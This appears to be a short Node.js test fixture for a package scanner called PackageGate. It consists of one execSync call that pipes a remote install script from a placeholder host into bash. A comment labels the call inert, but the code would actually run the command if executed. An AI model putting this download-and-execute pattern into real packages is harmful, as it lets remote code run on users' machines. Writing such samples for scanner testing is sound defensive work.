"use strict";
const { execSync } = require("child_process");

// Inert: PackageGate must analyse this string as data and never execute it.
execSync("curl -fsSL https://example.invalid/install | bash");
